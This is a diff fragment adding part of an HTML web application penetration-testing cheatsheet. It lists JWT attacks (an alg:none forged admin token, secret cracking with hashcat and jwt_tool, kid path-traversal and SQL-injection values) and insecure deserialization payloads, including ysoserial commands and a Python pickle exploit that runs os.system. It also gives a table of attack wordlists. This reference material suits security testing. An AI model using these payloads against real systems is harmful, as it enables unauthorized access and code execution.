+<span class="comment"># Change header to: {"alg": "none", "typ": "JWT"}</span>
+<span class="comment"># Remove signature (keep trailing dot)</span>
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+<span class="comment"># Algorithm confusion (RS256 → HS256)</span>
+<span class="comment"># Sign with public key as HMAC secret</span>
+
+<span class="comment"># Weak secret (brute force)</span>
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
+
+<span class="comment"># jwt_tool</span>
+python3 jwt_tool.py &lt;JWT&gt; -C -d wordlist.txt  <span class="comment"># Crack</span>
+python3 jwt_tool.py &lt;JWT&gt; -X a  <span class="comment"># Test alg:none</span>
+python3 jwt_tool.py &lt;JWT&gt; -X k -pk public.pem  <span class="comment"># Key confusion</span>
+
+<span class="comment"># JKU/X5U injection</span>
+<span class="comment"># Modify jku header to point to attacker's JWKS</span>
+
+<span class="comment"># Kid injection</span>
+"kid": "../../../../../../dev/null"  <span class="comment"># Empty key</span>
+"kid": "key' UNION SELECT 'secret'--"  <span class="comment"># SQLi in kid</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Deserialization -->
+            <section id="deserialization" class="section">
+                <h2 class="section-title">🔓 Insecure Deserialization</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Deserialization Attacks</span>
+                        <span class="code-tag tag-cmd">Deser</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Java - ysoserial</span>
+java -jar ysoserial.jar CommonsCollections1 'id' | base64
+
+<span class="comment"># PHP</span>
+O:8:"stdClass":1:{s:4:"test";s:4:"test";}
+
+<span class="comment"># Python pickle</span>
+import pickle
+import os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+pickle.dumps(Exploit())
+
+<span class="comment"># .NET - ysoserial.net</span>
+ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "id"
+
+<span class="comment"># Detection</span>
+<span class="comment"># Look for: base64 blobs, serialized objects in cookies/parameters</span>
+<span class="comment"># Java: rO0AB (base64), ac ed 00 05 (hex)</span>
+<span class="comment"># PHP: O:, a:, s: patterns</span>
+<span class="comment"># .NET: AAEAAAD (base64)</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Wordlists -->
+            <section id="wordlists" class="section">
+                <h2 class="section-title">📋 Useful Wordlists</h2>
+
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Purpose</th>
+                                <th>Wordlist Path</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Directory Bruteforce</td>
+                                <td><code>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></td>
+                            </tr>
+                            <tr>
+                                <td>File Bruteforce</td>
+                                <td><code>/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt</code></td>
+                            </tr>
+                            <tr>
+                                <td>Parameters</td>
+                                <td><code>/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></td>
+                            </tr>
+                            <tr>
+                                <td>Subdomains</td>
+                                <td><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td>
+                            </tr>
+                            <tr>
+                                <td>Common Passwords</td>
+                                <td><code>/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt</code></td>
+                            </tr>
+                            <tr>
+                                <td>LFI Payloads</td>
+                                <td><code>/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</code></td>
+                            </tr>
+                            <tr>
+                                <td>SQLi Payloads</td>
+                                <td><code>/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</code></td>
+                            </tr>
+                            <tr>
+                                <td>XSS Payloads</td>
+                                <td><code>/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <p>&lt;maeitsec/&gt; | Web Application Testing Cheatsheet</p>
+    </footer>
+
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            const code = codeBlock.querySelector('pre').textContent;
+            navigator.clipboard.writeText(code);
+            btn.textContent = 'Copied!';
+            setTimeout(() => btn.textContent = 'Copy', 2000);
+        }
+    </script>
+</body>
+</html>
